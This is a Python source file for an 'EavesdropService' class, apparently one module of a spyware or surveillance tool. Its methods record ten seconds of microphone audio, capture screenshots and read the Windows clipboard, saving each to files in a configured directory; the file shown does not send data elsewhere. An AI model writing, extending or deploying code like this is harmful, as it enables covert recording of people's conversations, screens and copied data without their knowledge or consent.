import sys

from settings import file_path
from PIL import ImageGrab
from scipy.io.wavfile import write
import sounddevice as sd
import win32clipboard


class EavesdropService:

    @staticmethod
    def microphone():
        fs = 44100
        seconds = 10
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(file_path + "\\" + "audio.wav", fs, recording)

    @staticmethod
    def screenshot():
        im = ImageGrab.grab()
        im.save(file_path + "\\" + "screenshot.png")

    @staticmethod
    def copy_clipboard():
        with open(file_path + "\\" + "e_clipboard.txt", "a") as f:
            try:
                if sys.platform == "win32":
                    import win32clipboard as clip
                    win32clipboard.OpenClipboard()
                    pasted_data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    print(pasted_data)
            except Exception as e:
                f.write("Clipboard could be not be copied")
                print(e)


